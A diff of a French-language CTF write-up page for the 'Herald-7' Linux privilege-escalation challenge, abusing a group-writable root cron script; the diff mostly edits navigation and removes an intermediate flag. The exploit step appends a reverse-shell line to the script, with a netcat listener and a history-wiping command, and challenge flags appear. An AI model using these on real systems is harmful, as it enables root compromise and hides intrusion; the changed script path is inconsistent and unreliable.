@@ -13,7 +13,7 @@
       <script>
         // Current page data
         var mkdocs_page_name = "HERALD-7";
-        var mkdocs_page_input_path = "Systeme\\writeup_CronTab_HERALD-7_v2.md";
+        var mkdocs_page_input_path = "Systeme/writeup_CronTab_HERALD-7_v2.md";
         var mkdocs_page_url = null;
       </script>
     
@@ -49,9 +49,13 @@
                   </li>
                   <li class="toctree-l1"><a class="reference internal" href="../../Reseaux/Flag114-pcap-forensic/">cap-forensic-mot de passe d'un archive</a>
                   </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../Reseaux/Flag146-Packet-tracer/">Packet-tracer</a>
+                  </li>
               </ul>
               <p class="caption"><span class="caption-text">Forensic</span></p>
               <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../forensic/pdf-metadata/">PDF metadata</a>
+                  </li>
                   <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier1-magic-bytes/">Tier 1 — Magic Bytes</a>
                   </li>
                   <li class="toctree-l1"><a class="reference internal" href="../../forensic/tier2-file-carving/">Tier 2 — File Carving</a>
@@ -103,8 +107,10 @@
                   </li>
                   <li class="toctree-l1"><a class="reference internal" href="../../logiciel/writeup_polygotte/">Polygotte</a>
                   </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../logiciel/emoji_jail/">Emoji_jail</a>
+                  </li>
               </ul>
-              <p class="caption"><span class="caption-text">Systeme</span></p>
+              <p class="caption"><span class="caption-text">Système Linux</span></p>
               <ul class="current">
                   <li class="toctree-l1"><a class="reference internal" href="../writeup_SUID_XENON-1/">XENON-1</a>
                   </li>
@@ -155,6 +161,25 @@
                   <li class="toctree-l1"><a class="reference internal" href="../writeup_PHANTOM-4/">PHANTOM-4</a>
                   </li>
               </ul>
+              <p class="caption"><span class="caption-text">Système Windows</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag%202%20%E2%80%94%20T%C3%A2che%20planifi%C3%A9e%20%C3%A9lev%C3%A9e/">Flag 2 — Tâche planifiée élevée</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag3-ACL-AD/">Flag 3 — ACL Active Directory</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag4-Historique-PS/">Flag 4 — Historique PowerShell</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag5-SMB-Share/">Flag 5 — SMB Share</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag6-LLMNR/">Flag 6 — LLMNR</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag7-KeePass/">Flag 7 — KeePass</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/Flag7b-Kerberos/">Flag 7b — Kerberos</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../windows/GUIDE-COMPLET-LAB-CTF/">LAB-CTF</a>
+                  </li>
+              </ul>
               <p class="caption"><span class="caption-text">Misc</span></p>
               <ul>
                   <li class="toctree-l1"><a class="reference internal" href="../../autre/Destruction_Vaisseau_0144/">Destruction Vaisseau</a>
@@ -174,7 +199,7 @@
         <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
   <ul class="wy-breadcrumbs">
     <li><a href="../.." class="icon icon-home" aria-label="Docs"></a></li>
-          <li class="breadcrumb-item">Systeme</li>
+          <li class="breadcrumb-item">Système Linux</li>
       <li class="breadcrumb-item active">HERALD-7</li>
     <li class="wy-breadcrumbs-aside">
     </li>
@@ -184,7 +209,7 @@
           <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
             <div class="section" itemprop="articleBody">
               
-                <h1 id="write-up-heralds-downfall">Write-up — Herald's Downfall</h1>
+                <h1 id="write-up-herald-7">Write-up — Herald-7</h1>
 <p><strong>CryptAbyss CTF 2026 | Categorie : Linux Privilege Escalation</strong></p>
 <hr />
 <h2 id="informations-du-challenge">Informations du challenge</h2>
@@ -198,7 +223,7 @@
 <tbody>
 <tr>
 <td>Nom</td>
-<td>Herald's Downfall</td>
+<td>Herald-7</td>
 </tr>
 <tr>
 <td>Vaisseau</td>
@@ -290,14 +315,7 @@ CONF
 chown root:operative /opt/.herald/system.conf
 chmod 640 /opt/.herald/system.conf
 
-# Script vulnerable avec flag intermediaire 2
-# Appartient a root:herald — writable uniquement par le groupe herald
-mkdir -p /opt/.scripts
-cat &gt; /opt/.scripts/patrol.sh &lt;&lt; 'SH'
-#!/bin/bash
-# CryptAbyss{SCR1PT_3XP053D_W41T1NG_F0R_1NJ3CT10N}
-echo &quot;HERALD-7 patrol cycle complete&quot; &gt;&gt; /var/herald/schedules/patrol_log.txt
-SH
+
 chown root:herald /opt/.scripts/patrol.sh
 chmod 770 /opt/.scripts/patrol.sh
 
@@ -410,12 +428,6 @@ ls -la /opt/.scripts/patrol.sh
 # -rwxrwx--- 1 root herald ... /opt/.scripts/patrol.sh
 </code></pre>
 <p>Le script est execute <strong>chaque minute par root</strong> et est <strong>modifiable par le groupe herald</strong> — dont fait partie <code>scheduler</code>. C'est la faille.</p>
-<p>On lit le contenu du script et y trouve le flag intermediaire 2 :</p>
-<pre><code class="language-bash">cat /opt/.scripts/patrol.sh
-# #!/bin/bash
-# CryptAbyss{SCR1PT_3XP053D_W41T1NG_F0R_1NJ3CT10N}
-# echo &quot;HERALD-7 patrol cycle complete&quot; &gt;&gt; /var/herald/schedules/patrol_log.txt
-</code></pre>
 <h3 id="etape-5-comprehension-de-la-vulnerabilite">etape 5 — Comprehension de la vulnerabilite</h3>
 <p>Le script <code>/opt/.scripts/patrol.sh</code> appartient a <code>root</code> et est lance automatiquement par root via le crontab système. Ses permissions <code>770</code> avec le groupe <code>herald</code> permettent a tout membre de ce groupe de le modifier. En injectant une commande, elle sera executee avec les droits root au prochain cycle.</p>
 <h3 id="etape-6-exploitation">etape 6 — Exploitation</h3>
@@ -423,7 +435,7 @@ ls -la /opt/.scripts/patrol.sh
 <pre><code class="language-bash">nc -lvnp 4444
 </code></pre>
 <p><strong>Sur la machine victime (en tant que scheduler) :</strong></p>
-<pre><code class="language-bash">echo &quot;bash -i &gt;&amp; /dev/tcp/&lt;VOTRE_IP&gt;/4444 0&gt;&amp;1&quot; &gt;&gt; /opt/.scripts/patrol.sh
+<pre><code class="language-bash">echo &quot;bash -i &gt;&amp; /dev/tcp/&lt;VOTRE_IP&gt;/4444 0&gt;&amp;1&quot; &gt;&gt; /opt/scripts/patrol.sh
 </code></pre>
 <p>Moins d'une minute plus tard, le crontab execute le script modifie et envoie un reverse shell root.</p>
 <h3 id="etape-7-obtention-du-flag">etape 7 — Obtention du flag</h3>
@@ -480,11 +492,6 @@ history -c &amp;&amp; rm ~/.bash_history
 <td>Intermediaire 1</td>
 <td><code>CryptAbyss{SCH3DUL3R_L0C4T3D_T1M3R_4CT1V3}</code></td>
 <td>Chiffré AES-256-CBC dans <code>/var/herald/schedules/.patrol_flag.txt</code> ; clé <code>trustno1</code> hachée en MD5 dans <code>/var/herald/schedules/.patrol_key.txt</code> (crackable via John/Hashcat)</td>
-</tr>
-<tr>
-<td>Intermediaire 2</td>
-<td><code>CryptAbyss{SCR1PT_3XP053D_W41T1NG_F0R_1NJ3CT10N}</code></td>
-<td>En clair dans <code>/opt/.scripts/patrol.sh</code></td>
 </tr>
 <tr>
 <td>Final</td>
